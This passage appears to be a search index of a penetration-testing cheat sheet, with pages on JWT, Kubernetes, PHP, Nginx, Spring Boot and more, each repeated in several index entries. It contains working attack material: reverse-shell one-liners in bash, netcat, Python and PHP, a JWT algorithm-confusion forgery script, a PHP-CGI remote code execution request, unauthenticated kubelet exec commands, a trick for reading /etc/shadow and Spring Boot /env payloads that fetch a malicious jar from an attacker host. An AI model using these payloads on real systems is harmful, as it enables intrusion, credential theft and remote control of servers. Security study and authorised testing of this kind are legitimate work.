Tokens). https://github.com/ticarpi/jwt_tool Exploit in Python On some vulnerable implementation, it's possible to replace the JWT algorithm from RS256 to HS256 . The vulnerable library use the public key as a secret. import jwt key = open('public_key.pem', 'r').read() jwt.encode({\"username\":\"admin\"}, key=key, algorithm='HS256') You need to install the pyjwt package in a specific version. In the last versions, the library check the key is a x509 certificate: File \".../lib/python3.6/site-packages/jwt/algorithms.py\", line 151, in prepare_key 'The specified key is an asymmetric key or x509 certificate and' jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. The version 0.4.3 has not this check: pip install pyjwt==0.4.3","title":"JWT"},{"location":"jwt/#json-web-token","text":"","title":"JSON Web Token"},{"location":"jwt/#finding-public-keys","text":"Some common locations for public keys are: /api/keys /api/v1/keys /.well-known/jwks.json /openid/connect/jwks.json /jwks.json","title":"Finding Public Keys"},{"location":"jwt/#vulnerabilities","text":"There is know vulnerabilities on JWT: CVE-2015-2951 : The alg=none signature-bypass vulnerability in JWT.php CVE-2016-10555 : The RS/HS256 public key mismatch vulnerability because the server does not enforce \"algorithm\" CVE-2018-0114 : It's possible to re-sign a token using a key that is embedded within the token","title":"Vulnerabilities"},{"location":"jwt/#jwt-toolkit","text":"jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens). https://github.com/ticarpi/jwt_tool","title":"JWT Toolkit"},{"location":"jwt/#exploit-in-python","text":"On some vulnerable implementation, it's possible to replace the JWT algorithm from RS256 to HS256 . The vulnerable library use the public key as a secret. import jwt key = open('public_key.pem', 'r').read() jwt.encode({\"username\":\"admin\"}, key=key, algorithm='HS256') You need to install the pyjwt package in a specific version. In the last versions, the library check the key is a x509 certificate: File \".../lib/python3.6/site-packages/jwt/algorithms.py\", line 151, in prepare_key 'The specified key is an asymmetric key or x509 certificate and' jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. The version 0.4.3 has not this check: pip install pyjwt==0.4.3","title":"Exploit in Python"},{"location":"kafka/","text":"Kafka Kafka API There is a Kafka API exposed over HTTP on port 8083 . This API can be used to get sensitive informations using the following URLs: http://<ip>:8083 {\"version\":\"2.3.0\",\"commit\":\"<hash>\",\"kafka_cluster_id\":\"<id>\"} http://<ip>:8083/connectors [\"mongo-Release\", \"<connector_name>\", ..., \"my-sqldata\"] http://<ip>:8083/connectors/<connector_name> { \"name\": \"<connector_name>\", \"config\": {...}, \"tasks\": [{ \"connector\": \"<connector_name>\", \"task\": 0 }], \"type\": \"sink\" }","title":"Kafka"},{"location":"kafka/#kafka","text":"","title":"Kafka"},{"location":"kafka/#kafka-api","text":"There is a Kafka API exposed over HTTP on port 8083 . This API can be used to get sensitive informations using the following URLs: http://<ip>:8083 {\"version\":\"2.3.0\",\"commit\":\"<hash>\",\"kafka_cluster_id\":\"<id>\"} http://<ip>:8083/connectors [\"mongo-Release\", \"<connector_name>\", ..., \"my-sqldata\"] http://<ip>:8083/connectors/<connector_name> { \"name\": \"<connector_name>\", \"config\": {...}, \"tasks\": [{ \"connector\": \"<connector_name>\", \"task\": 0 }], \"type\": \"sink\" }","title":"Kafka API"},{"location":"kubernetes/","text":"Kubernetes API The Kubernetes API exposes the port 10250 . This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /pods : https://<host>:<port>/pods {\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"dind-sgz8n\",\"generateName\":\"dind-\",\"namespace\":\"default\",\"selfLink\":\"/api/v1/namespaces/default/pods/dind-sgz8n\",`...}],\"qosClass\":\"BestEffort\"}}]} With the above information it's possible to send requests to the API to execute commands: $ curl --insecure -v -H \"W-Stream-Protocol-Version: v2.channel.k8s.io\" -H \"X-Stream-Protocol-Version: channel.k8s.io\" -H \"Connection: upgrade\" -H \"Upgrade: SPDY/3.1\" -X POST \"https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1\" In the response, there is a Location header to create a WebSocket connection: $ wscat -c \"https://<host>:<port>/<location_header>\" --no-check Lancer un pod qui se supprime automatiquement \u00e0 la fin $ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1 S'attacher \u00e0 un pod existant $ kubectl exec -it k8s-2-test -- /bin/bash Se connecter \u00e0 une session existante $ kubectl attach k8s-1-test -c k8s-1-test -i -t Copier un fichier d'un pod \u00e0 sa machine $ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner Afficher les services (format simple \u00e0 traiter) $ kubectl get services (-o wide) Afficher les pods (json) $ kubectl get pods -o json Afficher les pods (format simple \u00e0 traiter) $ kubectl get pods -o wide ## Get IP list $ kubectl get pods -o wide | sed -e 's/\\s\\+/ /g' | cut -f6 -d \" \" Afficher l'ensemble des secrets $ kubectl get secrets -o yaml","title":"Kubernetes"},{"location":"kubernetes/#kubernetes","text":"","title":"Kubernetes"},{"location":"kubernetes/#api","text":"The Kubernetes API exposes the port 10250 . This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /pods : https://<host>:<port>/pods {\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"dind-sgz8n\",\"generateName\":\"dind-\",\"namespace\":\"default\",\"selfLink\":\"/api/v1/namespaces/default/pods/dind-sgz8n\",`...}],\"qosClass\":\"BestEffort\"}}]} With the above information it's possible to send requests to the API to execute commands: $ curl --insecure -v -H \"W-Stream-Protocol-Version: v2.channel.k8s.io\" -H \"X-Stream-Protocol-Version: channel.k8s.io\" -H \"Connection: upgrade\" -H \"Upgrade: SPDY/3.1\" -X POST \"https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1\" In the response, there is a Location header to create a WebSocket connection: $ wscat -c \"https://<host>:<port>/<location_header>\" --no-check","title":"API"},{"location":"kubernetes/#lancer-un-pod-qui-se-supprime-automatiquement-a-la-fin","text":"$ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1","title":"Lancer un pod qui se supprime automatiquement \u00e0 la fin"},{"location":"kubernetes/#sattacher-a-un-pod-existant","text":"$ kubectl exec -it k8s-2-test -- /bin/bash","title":"S'attacher \u00e0 un pod existant"},{"location":"kubernetes/#se-connecter-a-une-session-existante","text":"$ kubectl attach k8s-1-test -c k8s-1-test -i -t","title":"Se connecter \u00e0 une session existante"},{"location":"kubernetes/#copier-un-fichier-dun-pod-a-sa-machine","text":"$ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner","title":"Copier un fichier d'un pod \u00e0 sa machine"},{"location":"kubernetes/#afficher-les-services-format-simple-a-traiter","text":"$ kubectl get services (-o wide)","title":"Afficher les services (format simple \u00e0 traiter)"},{"location":"kubernetes/#afficher-les-pods-json","text":"$ kubectl get pods -o json","title":"Afficher les pods (json)"},{"location":"kubernetes/#afficher-les-pods-format-simple-a-traiter","text":"$ kubectl get pods -o wide ## Get IP list $ kubectl get pods -o wide | sed -e 's/\\s\\+/ /g' | cut -f6 -d \" \"","title":"Afficher les pods (format simple \u00e0 traiter)"},{"location":"kubernetes/#afficher-lensemble-des-secrets","text":"$ kubectl get secrets -o yaml","title":"Afficher l'ensemble des secrets"},{"location":"linux/","text":"Linux Wildcard $ ls -al /*a*/www/*l/*la*/*la*.* # /var/www/html/flag/flag.php $ ls -al $ ls * -rw-rw-r-- 1 root root 0 jun 28 21:38 -al Run ELF using ld-linux You can run an ELF binary without the x flag using ld-linux : # From: https://twitter.com/leonjza/status/1201946856005259264 $ cp /bin/ls . $ ls ls $ chmod -x ls $ ls -l ls -rw-r--r-- 1 root root 126584 Dec 4 08:32 ls $ ./ls -bash: ./ls: Permission denied $ /lib64/ld-linux-x86-64.so.2 ./ls ls It can be useful when you can't set the bit or you have a capability on ld-linux set. Compile C/C++ including a file From @Poita_ and hboeck . You can include a file or even /dev/stdin when you compile a file. So, it's possible to include /etc/shadow if you have the correct permissions on the server. Hboeck explains that it's possible to get the file from online compiler ( cpp.sh may work). #include <stdio.h> int main() { printf(\"%s\\n\", #include </etc/shadow> ) return 0; } $ g++ a.cpp && ./a.out","title":"Linux"},{"location":"linux/#linux","text":"","title":"Linux"},{"location":"linux/#wildcard","text":"$ ls -al /*a*/www/*l/*la*/*la*.* # /var/www/html/flag/flag.php $ ls -al $ ls * -rw-rw-r-- 1 root root 0 jun 28 21:38 -al","title":"Wildcard"},{"location":"linux/#run-elf-using-ld-linux","text":"You can run an ELF binary without the x flag using ld-linux : # From: https://twitter.com/leonjza/status/1201946856005259264 $ cp /bin/ls . $ ls ls $ chmod -x ls $ ls -l ls -rw-r--r-- 1 root root 126584 Dec 4 08:32 ls $ ./ls -bash: ./ls: Permission denied $ /lib64/ld-linux-x86-64.so.2 ./ls ls It can be useful when you can't set the bit or you have a capability on ld-linux set.","title":"Run ELF using ld-linux"},{"location":"linux/#compile-cc-including-a-file","text":"From @Poita_ and hboeck . You can include a file or even /dev/stdin when you compile a file. So, it's possible to include /etc/shadow if you have the correct permissions on the server. Hboeck explains that it's possible to get the file from online compiler ( cpp.sh may work). #include <stdio.h> int main() { printf(\"%s\\n\", #include </etc/shadow> ) return 0; } $ g++ a.cpp && ./a.out","title":"Compile C/C++ including a file"},{"location":"miscs/","text":"Miscellaneous SSL/TLS SSL configuration examples Mozilla provides a tool to generate configuration files for various technologies of servers (web, SQL, ...). testssl.sh This tool let you scan a SSL/TLS server to check the supported protocols and ciphers. git clone --depth 1 https://github.com/drwetter/testssl.sh.git cd testssl.sh ./testssl.sh <ip>(:<port>) Nmap nmap -sC -sV -oA <output_name> <host> Performance If you scan a large range of IP the option --min-rate is handy to force nmap not to slow down and send at least this number of packet per second. I set the value to 1500 so one IP scan take a minimum of 45 seconds and a /24 about 3 hours. nmap may takes more time because of the --max-retries argument. By default the value is set to 10 , so nmap may retries 10 times the same prob and it can slow down the scan. However nmap usually does only one retransmission, so one host may take up to 1m30s. There is more informations about performance on the nmap documentation . Google API key There is potential miss-configuration when an application uses the Google Maps API: Contain an HTTP Referrer with a star like *example.com*/* Use on other Google Cloud Platform Console (BigQuery, Compute Engine, ...) Return the signature parameter The tool gmapsapiscanner can be used to detect invalid permissions on Google Maps API. Github dorking Search a PoC Security researchers often use gist or repository to publish their works. With the following URL you can search for a specific CVE exploit tool. https://github.com/search?q=\"<CVE-ID>\"+AND+exploit+in:name+in:description+in:readme https://gist.github.com/search?q=\"<CVE-ID>\" Get user SSH public keys When you add .keys in the URL of a user you can see their public SSH keys and associated emails addresses. https://github.com/<username>.keys Get raw commit When you add .patch to the URL of a commit you retrieve the raw commit file. This file contains git log and the user email. https://github.com/<username>/<repo>/commit/<sha>.patch Using the .diff extension you can get the diff with the previous commit. https://github.com/<username>/<repo>/commit/<sha>.diff Google dorking Find target on public sources From @adrien_jeanneau , you can search on Google for a target on website that can contains public information: site:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com \"<target>\" Default passwords The website cirt.net lists the default passwords on equipments or applications. Download recursively an Apache Directory Listing wget -r -N --no-parent --reject '*index.html*' -nH --cut-dirs=1 <url> Web Serve a file locally Here is a onliner (I don't remember from where) to expose a simple web server using netcat : while :; do (echo -ne \"HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c < index.html)\\r\\n\\r\\n\"; cat index.html) | nc -l -p 8080; done","title":"Others"},{"location":"miscs/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"miscs/#ssltls","text":"","title":"SSL/TLS"},{"location":"miscs/#ssl-configuration-examples","text":"Mozilla provides a tool to generate configuration files for various technologies of servers (web, SQL, ...).","title":"SSL configuration examples"},{"location":"miscs/#testsslsh","text":"This tool let you scan a SSL/TLS server to check the supported protocols and ciphers. git clone --depth 1 https://github.com/drwetter/testssl.sh.git cd testssl.sh ./testssl.sh <ip>(:<port>)","title":"testssl.sh"},{"location":"miscs/#nmap","text":"nmap -sC -sV -oA <output_name> <host>","title":"Nmap"},{"location":"miscs/#performance","text":"If you scan a large range of IP the option --min-rate is handy to force nmap not to slow down and send at least this number of packet per second. I set the value to 1500 so one IP scan take a minimum of 45 seconds and a /24 about 3 hours. nmap may takes more time because of the --max-retries argument. By default the value is set to 10 , so nmap may retries 10 times the same prob and it can slow down the scan. However nmap usually does only one retransmission, so one host may take up to 1m30s. There is more informations about performance on the nmap documentation .","title":"Performance"},{"location":"miscs/#google-api-key","text":"There is potential miss-configuration when an application uses the Google Maps API: Contain an HTTP Referrer with a star like *example.com*/* Use on other Google Cloud Platform Console (BigQuery, Compute Engine, ...) Return the signature parameter The tool gmapsapiscanner can be used to detect invalid permissions on Google Maps API.","title":"Google API key"},{"location":"miscs/#github-dorking","text":"","title":"Github dorking"},{"location":"miscs/#search-a-poc","text":"Security researchers often use gist or repository to publish their works. With the following URL you can search for a specific CVE exploit tool. https://github.com/search?q=\"<CVE-ID>\"+AND+exploit+in:name+in:description+in:readme https://gist.github.com/search?q=\"<CVE-ID>\"","title":"Search a PoC"},{"location":"miscs/#get-user-ssh-public-keys","text":"When you add .keys in the URL of a user you can see their public SSH keys and associated emails addresses. https://github.com/<username>.keys","title":"Get user SSH public keys"},{"location":"miscs/#get-raw-commit","text":"When you add .patch to the URL of a commit you retrieve the raw commit file. This file contains git log and the user email. https://github.com/<username>/<repo>/commit/<sha>.patch Using the .diff extension you can get the diff with the previous commit. https://github.com/<username>/<repo>/commit/<sha>.diff","title":"Get raw commit"},{"location":"miscs/#google-dorking","text":"","title":"Google dorking"},{"location":"miscs/#find-target-on-public-sources","text":"From @adrien_jeanneau , you can search on Google for a target on website that can contains public information: site:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com \"<target>\"","title":"Find target on public sources"},{"location":"miscs/#default-passwords","text":"The website cirt.net lists the default passwords on equipments or applications.","title":"Default passwords"},{"location":"miscs/#download-recursively-an-apache-directory-listing","text":"wget -r -N --no-parent --reject '*index.html*' -nH --cut-dirs=1 <url>","title":"Download recursively an Apache Directory Listing"},{"location":"miscs/#web","text":"","title":"Web"},{"location":"miscs/#serve-a-file-locally","text":"Here is a onliner (I don't remember from where) to expose a simple web server using netcat : while :; do (echo -ne \"HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c < index.html)\\r\\n\\r\\n\"; cat index.html) | nc -l -p 8080; done","title":"Serve a file locally"},{"location":"nginx/","text":"Nginx Configuration file Here is a miss-configuration in the the nginx.conf file: # static files location /static { alias /srv/app/static/; } The location value does not end with a / but the alias value does. Which means that if we query: https://example.com/static../foo then the location will match and will concatenate ../foo to the alias, which gives us this local file access: /srv/app/static/../foo RCE in php-fpm (CVE-2019-11043) If a webserver runs nginx + php-fpm and nginx have a configuration like location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } More informations on https://github.com/neex/phuip-fpizdam .","title":"Nginx"},{"location":"nginx/#nginx","text":"","title":"Nginx"},{"location":"nginx/#configuration-file","text":"Here is a miss-configuration in the the nginx.conf file: # static files location /static { alias /srv/app/static/; } The location value does not end with a / but the alias value does. Which means that if we query: https://example.com/static../foo then the location will match and will concatenate ../foo to the alias, which gives us this local file access: /srv/app/static/../foo","title":"Configuration file"},{"location":"nginx/#rce-in-php-fpm-cve-2019-11043","text":"If a webserver runs nginx + php-fpm and nginx have a configuration like location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } More informations on https://github.com/neex/phuip-fpizdam .","title":"RCE in php-fpm (CVE-2019-11043)"},{"location":"oauth/","text":"OAuth Common vulnerabilities CSRF: use state parameter Open redirection Short-lived and one-time use authorization codes Bearer token in the URI parameters Attack with pre-approved Client PKCE: Proof Key for Code Exchange (https://oauth.net/2/pkce/) Bypassing GitHub's OAuth flow In this article Teddy katz bypasses the OAuth flow using a common mistake in Rails router. By default, Rails pretend that the HEAD method is a GET without response body. Then it's possible to abuse the API ( POST requests still need CSRF token) and execute GET commands.","title":"OAuth"},{"location":"oauth/#oauth","text":"","title":"OAuth"},{"location":"oauth/#common-vulnerabilities","text":"CSRF: use state parameter Open redirection Short-lived and one-time use authorization codes Bearer token in the URI parameters Attack with pre-approved Client PKCE: Proof Key for Code Exchange (https://oauth.net/2/pkce/)","title":"Common vulnerabilities"},{"location":"oauth/#bypassing-githubs-oauth-flow","text":"In this article Teddy katz bypasses the OAuth flow using a common mistake in Rails router. By default, Rails pretend that the HEAD method is a GET without response body. Then it's possible to abuse the API ( POST requests still need CSRF token) and execute GET commands.","title":"Bypassing GitHub's OAuth flow"},{"location":"path-traversal/","text":"Path Traversal Fake current working directory This is a symbolic link to the current working directory of the process: file:///proc/self/cwd/ Remediation Java Before using the path and filename variables from the user inputs, the application has to verify the targeted file belongs in the correct directory DIRECTORY_BASE_PATH : // the use controls `path` and `filename`, so he can set the path to something bad File file = new File(DIRECTORY_BASE_PATH, path + filename); // we check if the canonical path on the disk match the `DIRECTORY_BASE_PATH` if (file.getCanonicalPath().startsWith(DIRECTORY_BASE_PATH)) { // The file is in the correct directory, we can process it! }","title":"Path Traversal"},{"location":"path-traversal/#path-traversal","text":"","title":"Path Traversal"},{"location":"path-traversal/#fake-current-working-directory","text":"This is a symbolic link to the current working directory of the process: file:///proc/self/cwd/","title":"Fake current working directory"},{"location":"path-traversal/#remediation","text":"","title":"Remediation"},{"location":"path-traversal/#java","text":"Before using the path and filename variables from the user inputs, the application has to verify the targeted file belongs in the correct directory DIRECTORY_BASE_PATH : // the use controls `path` and `filename`, so he can set the path to something bad File file = new File(DIRECTORY_BASE_PATH, path + filename); // we check if the canonical path on the disk match the `DIRECTORY_BASE_PATH` if (file.getCanonicalPath().startsWith(DIRECTORY_BASE_PATH)) { // The file is in the correct directory, we can process it! }","title":"Java"},{"location":"php/","text":"PHP Deserialization Phar deserialization The unserialization of a phar wrapper is realized in any file operation. Thus, file operation such as file_exists might be less protected, then it's possible to inject a phar wrapper within it. The following code describes how to create a phar wrapper: <?php require('weak_class.php'); # We craft an object by overwriting some methods and functions $obj = new WeakClass(); $obj->args = \"id\"; # Then, we serialize the object to a file file_put_contents(\"/tmp/exploit.phar\", serialize($obj)); Here is an example of exploitable functions: copy file_exists file_get_contents file_put_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype fopen is_dir is_executable is_file is_link is_readable is_writable lstat mkdir parse_ini_file readfile rename rmdir stat touch unlink CVE-2012-1823: RCE in PHP-CGI PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection. You can show the page source code: GET https://<host>/file.php?-s Or even execute PHP scripts (or a remote code execution) POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input <?php system('whoami'); ?> More details can be found on the Metasploit script here Laravel configuration file The Laravel configuration file is sometimes exposed on the Internet with a dotEnv file at the root level of the web server: https://<host>/.env You can find vulnerable target using a Google dork: \"DB_PASSWORD\" filetype:env PHP session files On PHP the directive session.save_path set the folder where PHP will store the session files. So the session files are written on the disk. A malicious user may read this files to retrieve information. On a Windows system (IIS), the default value create files in C:\\Windows\\Temp with the name sess_<session_id> . The <session_id> is the value of the PHPSESSIONID cookie. When you have a Local File Inclusion (LFI) vulnerability, it's possible to include this kind of files. This file contains some user's session variable. So a user can write some PHP code like <?php phpinfo() ?> (as a username for example) in his session and try to include the file to execute the PHP code. Here is 2 examples of exploitation: The Alcatel Omnivista 8770 uses this trick to fetch some internal session variable from the user session. The exploit gets the session file that is accessible on the server /session/sess_<session_id> . ippsec use this technique in the HTB box Sniper to create a use with a username that contains some PHP code. Then he includes the session file with a LFI.","title":"PHP"},{"location":"php/#php","text":"","title":"PHP"},{"location":"php/#deserialization","text":"","title":"Deserialization"},{"location":"php/#phar-deserialization","text":"The unserialization of a phar wrapper is realized in any file operation. Thus, file operation such as file_exists might be less protected, then it's possible to inject a phar wrapper within it. The following code describes how to create a phar wrapper: <?php require('weak_class.php'); # We craft an object by overwriting some methods and functions $obj = new WeakClass(); $obj->args = \"id\"; # Then, we serialize the object to a file file_put_contents(\"/tmp/exploit.phar\", serialize($obj)); Here is an example of exploitable functions: copy file_exists file_get_contents file_put_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype fopen is_dir is_executable is_file is_link is_readable is_writable lstat mkdir parse_ini_file readfile rename rmdir stat touch unlink","title":"Phar deserialization"},{"location":"php/#cve-2012-1823-rce-in-php-cgi","text":"PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection. You can show the page source code: GET https://<host>/file.php?-s Or even execute PHP scripts (or a remote code execution) POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input <?php system('whoami'); ?> More details can be found on the Metasploit script here","title":"CVE-2012-1823: RCE in PHP-CGI"},{"location":"php/#laravel-configuration-file","text":"The Laravel configuration file is sometimes exposed on the Internet with a dotEnv file at the root level of the web server: https://<host>/.env You can find vulnerable target using a Google dork: \"DB_PASSWORD\" filetype:env","title":"Laravel configuration file"},{"location":"php/#php-session-files","text":"On PHP the directive session.save_path set the folder where PHP will store the session files. So the session files are written on the disk. A malicious user may read this files to retrieve information. On a Windows system (IIS), the default value create files in C:\\Windows\\Temp with the name sess_<session_id> . The <session_id> is the value of the PHPSESSIONID cookie. When you have a Local File Inclusion (LFI) vulnerability, it's possible to include this kind of files. This file contains some user's session variable. So a user can write some PHP code like <?php phpinfo() ?> (as a username for example) in his session and try to include the file to execute the PHP code. Here is 2 examples of exploitation: The Alcatel Omnivista 8770 uses this trick to fetch some internal session variable from the user session. The exploit gets the session file that is accessible on the server /session/sess_<session_id> . ippsec use this technique in the HTB box Sniper to create a use with a username that contains some PHP code. Then he includes the session file with a LFI.","title":"PHP session files"},{"location":"ports/","text":"Ports Here is a list of default ports for services and links to the tips: Port Service Vulnerabilities 22 SSH 21 FTP 2375 Docker 3268 LDAP (Global catalog) 5985 WinRM (HTTP) 5986 WinRM (HTTPS) 8009 AJP AJP Ghostcat 8083 Kafka 9200 ElasticSearch 9300 ElasticSearch 10250 Kubernetes","title":"Ports"},{"location":"ports/#ports","text":"Here is a list of default ports for services and links to the tips: Port Service Vulnerabilities 22 SSH 21 FTP 2375 Docker 3268 LDAP (Global catalog) 5985 WinRM (HTTP) 5986 WinRM (HTTPS) 8009 AJP AJP Ghostcat 8083 Kafka 9200 ElasticSearch 9300 ElasticSearch 10250 Kubernetes","title":"Ports"},{"location":"reverse-shell/","text":"Reverse-Shell A list of Reverse Shells on multiple languages. Replace {IP} and {PORT} values with a couple IP:port the server can access. Then, on your local machine you open a listener with netcat : On local machine Listen with NetCat To listen for an incoming connection and upgrade to a pty shell: nc -lvnp {PORT} # after the connection is established python -c 'import pty; pty.spawn(\"/bin/bash\")' On macOS use the netcat from homebrew instead of the one provided by the OS You can use rlwrap to use arrow keys. Upgrade the shell Then, Ctrl-Z to suspend the connection and return to your own terminal. Type on your terminal: stty raw -echo The console should be black, next foreground the shell with: fg reset On target host: export SHELL=bash export TERM=xterm-256color stty rows 24 columns 80 Now you should have a complete shell with shortcuts available. On the remote server Windows Upload nc.exe on the remote server then use the command (same as NetCat ): cmd.exe /C \"nc.exe {IP} {PORT} -e cmd.exe\" PowerShell This is explain in the Windows / Download and execute script section . Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Bash bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash , then you can use bash -c \"<cmd>\" to force the bash Netcat nc -e /bin/sh {IP} {PORT} Java r = Runtime.getRuntime();p = r.exec([\"your payload\"] as String[]);p.waitFor() String[] cmd={\"cmd\",\"/C\",\"<cmd>\"};Runtime.getRuntime().exec(cmd); This payload can also work with BeanShell scripts. PHP php -r '\\$sock=fsockopen(\\\"{IP}\\\",{PORT});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");' Forward shell If the remote server cannot contact your local machine, it's still possible to use a shell that accept commands from named pipes using mkfifo and send the output to a file. IppSec has a repository on Github with a simple but effective script to demonstrate the technique on a vulnerable web server: forward-shell . You need to set the vulnerable url ( self.url = r\"http://'... ) and the exploit arguments ( headers = {'User-Agent': payload} ). Remember that you can use the same technique on other services that allow you to inject commands.","title":"Reverse Shell"},{"location":"reverse-shell/#reverse-shell","text":"A list of Reverse Shells on multiple languages. Replace {IP} and {PORT} values with a couple IP:port the server can access. Then, on your local machine you open a listener with netcat :","title":"Reverse-Shell"},{"location":"reverse-shell/#on-local-machine","text":"","title":"On local machine"},{"location":"reverse-shell/#listen-with-netcat","text":"To listen for an incoming connection and upgrade to a pty shell: nc -lvnp {PORT} # after the connection is established python -c 'import pty; pty.spawn(\"/bin/bash\")' On macOS use the netcat from homebrew instead of the one provided by the OS You can use rlwrap to use arrow keys.","title":"Listen with NetCat"},{"location":"reverse-shell/#upgrade-the-shell","text":"Then, Ctrl-Z to suspend the connection and return to your own terminal. Type on your terminal: stty raw -echo The console should be black, next foreground the shell with: fg reset On target host: export SHELL=bash export TERM=xterm-256color stty rows 24 columns 80 Now you should have a complete shell with shortcuts available.","title":"Upgrade the shell"},{"location":"reverse-shell/#on-the-remote-server","text":"","title":"On the remote server"},{"location":"reverse-shell/#windows","text":"Upload nc.exe on the remote server then use the command (same as NetCat ): cmd.exe /C \"nc.exe {IP} {PORT} -e cmd.exe\"","title":"Windows"},{"location":"reverse-shell/#powershell","text":"This is explain in the Windows / Download and execute script section .","title":"PowerShell"},{"location":"reverse-shell/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'","title":"Python"},{"location":"reverse-shell/#bash","text":"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash , then you can use bash -c \"<cmd>\" to force the bash","title":"Bash"},{"location":"reverse-shell/#netcat","text":"nc -e /bin/sh {IP} {PORT}","title":"Netcat"},{"location":"reverse-shell/#java","text":"r = Runtime.getRuntime();p = r.exec([\"your payload\"] as String[]);p.waitFor() String[] cmd={\"cmd\",\"/C\",\"<cmd>\"};Runtime.getRuntime().exec(cmd); This payload can also work with BeanShell scripts.","title":"Java"},{"location":"reverse-shell/#php","text":"php -r '\\$sock=fsockopen(\\\"{IP}\\\",{PORT});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'","title":"PHP"},{"location":"reverse-shell/#forward-shell","text":"If the remote server cannot contact your local machine, it's still possible to use a shell that accept commands from named pipes using mkfifo and send the output to a file. IppSec has a repository on Github with a simple but effective script to demonstrate the technique on a vulnerable web server: forward-shell . You need to set the vulnerable url ( self.url = r\"http://'... ) and the exploit arguments ( headers = {'User-Agent': payload} ). Remember that you can use the same technique on other services that allow you to inject commands.","title":"Forward shell"},{"location":"spring_boot/","text":"Spring Boot Spring Boot Actuators API The Spring Boot Framework includes a bunch of features called actuators to monitor apps. When the application is running, it registers endpoints that are accessible without authentication. Here are some actuators : /dump : displays a dump of threads (including a stack trace) /trace : displays the last several HTTP messages (which could include session identifiers) /logfile : outputs the contents of the log file /shutdown : shuts the application down /mappings : shows all of the MVC controller mappings /env : provides access to the configuration environment /restart : restarts the application For instance, it's possible to dump the heap memory of the server: https://<host>/path/actuator/heapdump A brute-force list can be found here: spring_boot.txt Jolokia An other Sping Boot endpoint is jolokia . It allow the user to perform the same actions as the JMX. https://<host>/path/jolokia/list It can be used to perform remote code execution. Env The /env endpoint allows to update the Spring Boot environmental properties. It's possible to execute SQL commands: POST /env HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0 spring.datasource.tomcat.validationQuery=<sql cmd> Also, it's possible to update the env to execute code with the properties: spring.cloud.bootstrap.location which is used to load external configuration file: POST /env HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0 spring.cloud.bootstrap.location=http://<attacker>/malicious-config-file.yml The malicious configuration file can be: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://<attacker>/malicious.jar\"] ]] ] You need to refresh the configuration: POST /refresh HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0","title":"Spring Boot"},{"location":"spring_boot/#spring-boot","text":"","title":"Spring Boot"},{"location":"spring_boot/#spring-boot-actuators-api","text":"The Spring Boot Framework includes a bunch of features called actuators to monitor apps. When the application is running, it registers endpoints that are accessible without authentication. Here are some actuators : /dump : displays a dump of threads (including a stack trace) /trace : displays the last several HTTP messages (which could include session identifiers) /logfile : outputs the contents of the log file /shutdown : shuts the application down /mappings : shows all of the MVC controller mappings /env : provides access to the configuration environment /restart : restarts the application For instance, it's possible to dump the heap memory of the server: https://<host>/path/actuator/heapdump A brute-force list can be found here: spring_boot.txt","title":"Spring Boot Actuators API"},{"location":"spring_boot/#jolokia","text":"An other Sping Boot endpoint is jolokia 